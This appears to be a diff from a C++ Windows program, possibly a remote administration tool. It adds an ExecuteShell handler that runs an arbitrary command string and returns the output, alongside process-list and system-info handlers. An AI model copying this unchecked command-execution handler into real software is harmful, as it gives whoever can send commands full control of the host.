@@ -9,6 +9,12 @@ LPCSTR ProcessList(){
 	StringCbPrintf(lpResponse,MAX_DATA_LENGTH,"%s",pList.c_str());
 	return lpResponse;
 }
+LPCSTR ExecuteShell(LPCSTR command){
+	std::string pList = ExecuteCommand(command);
+	LPSTR lpResponse = new CHAR[MAX_DATA_LENGTH];
+	StringCbPrintf(lpResponse,MAX_DATA_LENGTH,"%s",pList.c_str());
+	return lpResponse;
+}
 LPCSTR SystemInfo(){
 	
 	LPSTR lpResponse = new CHAR[MAX_DATA_LENGTH];
